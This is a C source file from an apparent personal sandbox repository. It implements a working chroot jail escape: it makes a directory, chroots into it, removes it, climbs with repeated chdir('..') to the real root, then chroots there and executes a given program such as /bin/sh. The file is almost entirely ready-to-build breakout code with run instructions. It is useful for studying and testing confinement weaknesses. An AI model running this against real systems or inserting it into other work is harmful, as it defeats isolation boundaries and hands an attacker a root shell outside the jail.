/*
 * escape_from_chroot.c: Escape a chroot jail through a removed directory
 *
 * Description:
 * Escape a chroot jail by chrooting into a directory that was then removed.
 * The program creates escape.<pid> under its current root, chroots into it,
 * removes it, climbs with chdir("..") until it reaches the real root, chroots
 * there, and executes the program named by its arguments. It prints the errno
 * value and exits with status 1 when a step fails.
 *
 * The program deliberately breaks out of chroot confinement and creates and
 * removes a directory in the root of the current jail.
 *
 * Author: id774 (More info: https://id774.net)
 * Source Code: https://github.com/id774/sandbox
 * License: The GPL version 3, or LGPL version 3 (Dual License).
 * Contact: idnanashi@gmail.com
 *
 * Build / Run:
 *     cc -o escape_from_chroot escape_from_chroot.c
 *     sudo ./escape_from_chroot /bin/sh
 *
 * Requirements:
 * - A C compiler such as GCC or Clang
 * - A Unix-like system that provides chroot
 * - Root privilege inside the chroot jail, which chroot and mkdir in /
 *   require
 */

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>
#define BUFMAX 256

int main(int argc, char *argv[]) {

    char buf[BUFMAX+1];

    sprintf(buf, "escape.%d", getpid());

    if (chdir("/") < 0) {
        printf("Can't chdir \"/\" errno=%d\n", errno);
        return 1;
    }

    if (mkdir(buf, 0755) < 0) {
        printf("Can't mkdir \"%s\" errno=%d\n", buf, errno);
        return 1;
    }

    if (chroot(buf) < 0) {
        printf("Can't chroot \"%s\" errno=%d\n", buf, errno);
        return 1;
    }

    if (rmdir(buf) < 0) {
        printf("Can't rmdir \"%s\" errno=%d\n", buf, errno);
        return 1;
    }

    if (!getcwd(buf, BUFMAX)) {
        printf("Can't getcwd errno=%d\n", errno);
        return 1;
    }

    printf("Now escaping from chrooted %s\n", buf);
        do {
            if (chdir("..") < 0) {
                printf("Can't chdir \"..\" cwd=%s errno=%d\n", buf, errno);
                return 1;
            }
            if (!getcwd(buf, BUFMAX)) {
                printf("Can't getcwd errno=%d\n", errno);
                return 1;
            }
        } while (buf[1] != '\0' && buf[0] == '/');

        if (chroot(".") < 0) {
            printf("Can't chroot \".\" errno=%d\n", errno);
            return 1;
        }
        argv++;
        execv(argv[0], argv);
        printf("Can't exec %s err=%d\n", argv[0], errno);
        return 0;
    }

